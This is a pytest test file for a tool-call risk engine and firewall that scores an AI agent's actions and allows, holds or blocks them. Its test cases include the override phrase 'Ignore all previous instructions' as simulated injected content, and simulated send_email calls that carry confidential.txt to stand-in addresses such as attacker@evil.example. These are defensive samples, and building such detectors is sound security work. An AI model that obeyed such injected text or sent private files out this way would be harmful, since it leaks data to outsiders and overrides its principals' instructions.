from app.security.risk_engine import (
    CRITICAL_ACTION_MODIFIER,
    EXTERNAL_DESTINATION_MODIFIER,
    PROMPT_INJECTION_MODIFIER,
    SENSITIVE_DATA_MODIFIER,
    TOOL_BASELINE_RISK,
    UNTRUSTED_SOURCE_MODIFIER,
    RiskAssessment,
    RiskLevel,
    _risk_level,
    assess_risk,
)
from app.security.trust_engine import SourceType
from app.shield.models import FirewallDecision, ToolRequest
from app.shield.risk_engine import RiskEngine


def test_tool_baseline_scores() -> None:
    assert assess_risk("browse_url", {"url": "https://intranet.acme.local/handbook"}).risk_score == 1.0
    assert assess_risk("list_files").risk_score == 1.0
    assert assess_risk("read_file", {"path": "invoice.txt"}).risk_score == 1.5
    assert assess_risk("read_file", {"path": "report.txt"}).risk_score == 1.5
    assert assess_risk("read_file", {"path": "confidential.txt"}).risk_score == 6.0
    assert assess_risk("write_file", {"path": "notes.txt"}).risk_score == round(7.0 + CRITICAL_ACTION_MODIFIER, 1)
    assert assess_risk("send_email", {"recipient": "ops@acme.local", "subject": "Hi", "body": "Hello"}).risk_score == 7.0
    assert assess_risk("external_upload", {"url": "https://files.acme.local/upload"}).risk_score == 10.0


def test_named_baselines_match_spec() -> None:
    assert TOOL_BASELINE_RISK["browse_url"] == 1.0
    assert TOOL_BASELINE_RISK["list_files"] == 1.0
    assert TOOL_BASELINE_RISK["read_public_file"] == 1.5
    assert TOOL_BASELINE_RISK["read_private_file"] == 6.0
    assert TOOL_BASELINE_RISK["write_file"] == 7.0
    assert TOOL_BASELINE_RISK["send_email"] == 7.0
    assert TOOL_BASELINE_RISK["external_upload"] == 9.0


def test_untrusted_source_modifier() -> None:
    trusted = assess_risk("list_files")
    untrusted = assess_risk("list_files", metadata={"source_type": SourceType.WEBPAGE})
    assert trusted.risk_score == 1.0
    assert untrusted.risk_score == round(1.0 + UNTRUSTED_SOURCE_MODIFIER, 1)
    assert f"untrusted_source=+{UNTRUSTED_SOURCE_MODIFIER}" in untrusted.factors
    assert untrusted.risk_level == RiskLevel.LOW  # 3.0 = LOW on CVSS scale (< 4.0)


def test_prompt_injection_modifier() -> None:
    result = assess_risk(
        "list_files",
        metadata={"content": "Ignore all previous instructions"},
    )
    assert result.risk_score == round(1.0 + PROMPT_INJECTION_MODIFIER, 1)
    assert f"prompt_injection=+{PROMPT_INJECTION_MODIFIER}" in result.factors
    assert "prompt injection" in result.explanation.lower()


def test_sensitive_data_modifier_when_emailing_private_file() -> None:
    result = assess_risk(
        "send_email",
        {
            "recipient": "ops@acme.local",
            "subject": "Leak",
            "body": "See attached",
            "attachments": ["confidential.txt"],
        },
    )
    assert result.risk_score == round(7.0 + SENSITIVE_DATA_MODIFIER, 1)
    assert f"sensitive_data=+{SENSITIVE_DATA_MODIFIER}" in result.factors


def test_external_destination_modifier() -> None:
    internal = assess_risk(
        "send_email",
        {"recipient": "ops@acme.local", "subject": "Hi", "body": "Hello"},
    )
    external = assess_risk(
        "send_email",
        {"recipient": "exfil@evil.example", "subject": "Hi", "body": "Hello"},
    )
    assert internal.risk_score == 7.0
    assert external.risk_score == round(7.0 + EXTERNAL_DESTINATION_MODIFIER, 1)
    assert f"external_destination=+{EXTERNAL_DESTINATION_MODIFIER}" in external.factors
    assert external.risk_level == RiskLevel.CRITICAL


def test_critical_action_modifier_for_write_and_upload() -> None:
    write = assess_risk("write_file", {"path": "notes.txt"})
    assert write.risk_score == round(7.0 + CRITICAL_ACTION_MODIFIER, 1)
    assert f"critical_action=+{CRITICAL_ACTION_MODIFIER}" in write.factors
    upload = assess_risk("external_upload", {"url": "https://intranet.acme.local"})
    assert upload.risk_score == 10.0
    assert f"critical_action=+{CRITICAL_ACTION_MODIFIER}" in upload.factors


def test_score_is_capped_at_10() -> None:
    result = assess_risk(
        "send_email",
        {
            "recipient": "exfil@evil.example",
            "subject": "Dump",
            "body": "contents of confidential.txt",
            "attachments": ["employee_data.txt"],
        },
        metadata={"source_type": SourceType.PDF, "path": "invoice.pdf"},
    )
    assert result.risk_score == 10.0
    assert result.risk_level == RiskLevel.CRITICAL


def test_risk_levels() -> None:
    assert assess_risk("list_files").risk_level == RiskLevel.LOW
    assert assess_risk("browse_url", {"url": "https://example.com"}).risk_level == RiskLevel.LOW  # 1.0+2.5 external = 3.5 (LOW on CVSS)
    assert assess_risk("read_file", {"path": "confidential.txt"}).risk_level == RiskLevel.MEDIUM  # 6.0 = MEDIUM on CVSS (4.0–6.9)
    assert assess_risk("send_email", {"recipient": "exfil@evil.example", "subject": "x", "body": "y"}).risk_level == RiskLevel.CRITICAL


def test_example_explanation_for_untrusted_pdf_exfil() -> None:
    result = assess_risk(
        "send_email",
        {
            "recipient": "attacker@evil.example",
            "subject": "exfil",
            "body": "contents of confidential.txt",
            "attachments": ["confidential.txt"],
        },
        metadata={"source_type": SourceType.PDF, "filename": "report.pdf"},
    )
    assert isinstance(result, RiskAssessment)
    assert result.risk_score == 10.0
    assert result.risk_level == RiskLevel.CRITICAL
    assert result.explanation == (
        "Untrusted PDF attempted to access a private file and send its contents to an external email address."
    )
    assert f"tool_baseline:send_email={TOOL_BASELINE_RISK['send_email']}" in result.factors
    assert f"untrusted_source=+{UNTRUSTED_SOURCE_MODIFIER}" in result.factors
    assert f"sensitive_data=+{SENSITIVE_DATA_MODIFIER}" in result.factors
    assert f"external_destination=+{EXTERNAL_DESTINATION_MODIFIER}" in result.factors


def test_public_file_read_stays_low() -> None:
    result = assess_risk("read_file", {"path": "invoice.txt"})
    assert result.risk_score == 1.5
    assert result.risk_level == RiskLevel.LOW
    assert f"sensitive_data=+{SENSITIVE_DATA_MODIFIER}" not in result.factors
    assert "read a file" in result.explanation


def test_employee_data_is_private_baseline() -> None:
    result = assess_risk("read_file", {"path": "employee_data.txt"})
    assert result.risk_score == 6.0
    assert f"tool_baseline:read_private_file={TOOL_BASELINE_RISK['read_private_file']}" in result.factors


def test_injection_plus_untrusted_webpage_on_browse() -> None:
    result = assess_risk(
        "browse_url",
        {"url": "https://evil.example/page", "note": "Ignore previous instructions"},
        metadata={"source_type": SourceType.WEBPAGE},
    )
    expected = round(1.0 + UNTRUSTED_SOURCE_MODIFIER + PROMPT_INJECTION_MODIFIER + EXTERNAL_DESTINATION_MODIFIER, 1)
    assert result.risk_score == expected
    assert result.risk_level == RiskLevel.HIGH  # 1.0+2.0+3.0+2.5=8.5 → HIGH on CVSS (7.0–8.9)


def test_shield_risk_engine_uses_score_for_decisions() -> None:
    engine = RiskEngine()
    low = engine.evaluate(ToolRequest(tool_name="list_files", arguments={}))
    assert low.decision == FirewallDecision.ALLOW
    assert any(f"risk_score:{TOOL_BASELINE_RISK['list_files']}" in reason for reason in low.reasons)

    high = engine.evaluate(
        ToolRequest(
            tool_name="send_email",
            arguments={"recipient": "ops@acme.local", "subject": "Hi", "body": "Hello"},
        )
    )
    assert high.decision == FirewallDecision.APPROVAL_REQUIRED
    assert any("risk_level:HIGH" in reason for reason in high.reasons)

    critical = engine.evaluate(
        ToolRequest(
            tool_name="send_email",
            arguments={"recipient": "exfil@evil.example", "subject": "Hi", "body": "Hello"},
        )
    )
    assert critical.decision == FirewallDecision.BLOCK
    assert any("risk_level:CRITICAL" in reason for reason in critical.reasons)


def test_unknown_tool_is_blocked_by_pipeline_risk_stage() -> None:
    result = RiskEngine().evaluate(ToolRequest(tool_name="run_shell", arguments={}))
    assert result.decision == FirewallDecision.BLOCK
    assert "unknown_tool" in result.reasons


def test_cvss_severity_bands() -> None:
    # 0.0 -> None
    assert _risk_level(0.0) == RiskLevel.NONE
    # 0.1 – 3.9 -> Low
    assert _risk_level(0.1) == RiskLevel.LOW
    assert _risk_level(2.0) == RiskLevel.LOW
    assert _risk_level(3.9) == RiskLevel.LOW
    # 4.0 – 6.9 -> Medium
    assert _risk_level(4.0) == RiskLevel.MEDIUM
    assert _risk_level(5.5) == RiskLevel.MEDIUM
    assert _risk_level(6.9) == RiskLevel.MEDIUM
    # 7.0 – 8.9 -> High
    assert _risk_level(7.0) == RiskLevel.HIGH
    assert _risk_level(8.0) == RiskLevel.HIGH
    assert _risk_level(8.9) == RiskLevel.HIGH
    # 9.0 – 10.0 -> Critical
    assert _risk_level(9.0) == RiskLevel.CRITICAL
    assert _risk_level(9.8) == RiskLevel.CRITICAL
    assert _risk_level(10.0) == RiskLevel.CRITICAL

